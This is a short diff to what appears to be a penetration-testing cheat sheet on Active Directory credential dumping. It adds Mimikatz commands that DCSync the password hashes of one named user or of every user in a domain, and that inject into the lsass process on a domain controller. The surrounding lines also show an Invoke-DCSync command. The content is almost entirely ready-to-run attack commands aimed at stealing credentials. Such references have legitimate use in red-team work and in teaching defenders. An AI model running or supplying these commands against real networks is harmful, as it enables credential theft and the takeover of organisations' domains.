@@ -22,6 +22,19 @@
 
     Invoke-DCSync -dcfqdn DC01.security.local -username administrator
 
+### Mimikatz
+
+##### Dump hashes for a specified users
+
+    Invoke-Mimikatz -command '"lsadump::dcsync /domain:security.local /user:moe"'
+
+##### Dump hashes for all users
+
+    Invoke-Mimikatz -command '"lsadump::dcsync /domain:security.local /all"'
+
+##### Dump hashes by injecting into the lsass process on the Domain Controller
+
+    Invoke-Mimikatz -command '"lsadump::lsa /inject"'
 
 ### NTDSUtil
 
